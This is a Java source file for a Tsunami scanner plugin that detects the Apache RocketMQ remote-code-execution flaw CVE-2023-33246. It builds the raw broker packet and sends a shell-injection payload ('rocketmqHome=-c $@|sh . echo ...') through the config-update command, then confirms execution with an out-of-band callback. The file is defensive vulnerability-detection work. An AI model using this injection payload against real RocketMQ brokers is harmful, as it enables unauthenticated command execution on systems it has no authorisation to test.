/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202333246;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.socket.TsunamiSocketFactory;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.cve202333246.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;
import javax.net.SocketFactory;

/** A Tsunami plugin that detects RocketMQ RCE vulnerability CVE-2023-33246. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "RocketMqCve202333246Detector",
    version = "0.1",
    description = "This plugin detects the RocketMQ CVE-2023-33246 RCE vulnerability.",
    author = "Raul Mijan (raul@doyensec.com)",
    bootstrapModule = RocketMqCve202333246DetectorBootstrapModule.class)
public final class RocketMqCve202333246Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final String ROCKETMQ_RESPONSE_INDICATOR = "serializeTypeCurrentRPC";
  private static final String ROCKETMQ_PAYLOAD_HEADER_TEMPLATE =
      "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}";
  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;
  private final TsunamiSocketFactory socketFactory;
  private final int oobSleepDuration;

  @Inject
  RocketMqCve202333246Detector(
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator,
      TsunamiSocketFactory socketFactory,
      @OobSleepDuration int oobSleepDuration) {
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.socketFactory = checkNotNull(socketFactory);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE-2023-33246"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("RocketMQ Remote Code Execution Vulnerability (CVE-2023-33246)")
            .setDescription(
                "Apache RocketMQ allows unauthenticated attackers to modify the broker"
                    + " configuration through a command injection vulnerability, leading to remote"
                    + " code execution.")
            .setRecommendation(
                "Remove RocketMQ from internet exposure and apply the latest patches to mitigate"
                    + " the issue.")
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-33246"))
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting detection of RocketMQ CVE-2023-33246.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isRocketMQService)
                .filter(this::isServiceVulnerable)
                .map(service -> buildDetectionReport(targetInfo, service))
                .collect(toImmutableList()))
        .build();
  }

  private byte[] preparePayload(Boolean isProbe, String command) {
    int code;
    String body = "";
    if (isProbe) {
      code = 0;
      body = "";
    } else {
      code = 25;
      body = "filterServerNums=1\nrocketmqHome=-c $@|sh . echo " + command + ";\n";
    }

    // Prepare payload
    String jsonHeader = String.format(ROCKETMQ_PAYLOAD_HEADER_TEMPLATE, code);

    byte[] jsonHeaderBytes = jsonHeader.getBytes(StandardCharsets.UTF_8);
    byte[] bodyBytes = body.getBytes(StandardCharsets.UTF_8);

    // Build the payload
    int totalLength = 4 + jsonHeaderBytes.length + bodyBytes.length;
    ByteBuffer payload = ByteBuffer.allocate(totalLength + 4);
    payload.putInt(totalLength);
    payload.putInt(jsonHeaderBytes.length);
    payload.put(jsonHeaderBytes);
    payload.put(bodyBytes);
    return payload.array();
  }

  private byte[] prepareProbePayload() {
    return this.preparePayload(true, null);
  }

  private byte[] sendPayload(NetworkService service, byte[] payload) {
    var serviceIp = service.getNetworkEndpoint().getIpAddress().getAddress();
    var servicePort = service.getNetworkEndpoint().getPort().getPortNumber();

    try (var socket = socketFactory.createSocket(serviceIp, servicePort)) {
      socket.getOutputStream().write(payload);

      byte[] response = new byte[4096];
      int bytesRead = socket.getInputStream().read(response);
      if (bytesRead <= 0) {
        logger.atWarning().log(
            "Failed to read response from target server. Read %s bytes.", bytesRead);
        return null;
      }
      return response;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log(
          "Failed to send payload to service at %s:%s.", serviceIp, servicePort);
      return null;
    }
  }

  private boolean isRocketMQService(NetworkService service) {
    logger.atInfo().log("Checking if the service is a RocketMQ service.");

    // Send Probe Payload
    byte[] probePayload = prepareProbePayload();
    byte[] response = sendPayload(service, probePayload);

    if (response == null) {
      return false;
    }

    // Check response
    String responseStr = new String(response, StandardCharsets.UTF_8);
    if (responseStr.contains(ROCKETMQ_RESPONSE_INDICATOR)) {
      logger.atInfo().log("Service identified as RocketMQ.");
      return true;
    } else {
      logger.atInfo().log("Service does not appear to be RocketMQ.");
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService service) {
    logger.atInfo().log("Checking if RocketMQ service is vulnerable.");

    if (!payloadGenerator.isCallbackServerEnabled()) {
      logger.atWarning().log(
          "The Tsunami callback server is not available, therefore the presence of the"
              + " vulnerability cannot be verified.");
      return false;
    }

    PayloadGeneratorConfig payloadConfig =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload tsunamiPayload = payloadGenerator.generate(payloadConfig);

    if (tsunamiPayload == null) {
      logger.atWarning().log("There was an error in the generation of the Tsunami payload.");
      return false;
    }

    String command = tsunamiPayload.getPayload();

    // Prepare and send payload to the service
    byte[] preparedPayload = preparePayload(false, command);
    byte[] response = sendPayload(service, preparedPayload);
    if (response == null) {
      return false;
    }

    // Wait for execution before checking for callback
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));

    return tsunamiPayload.checkIfExecuted();
  }

  private DetectionReport buildDetectionReport(TargetInfo targetInfo, NetworkService service) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(service)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
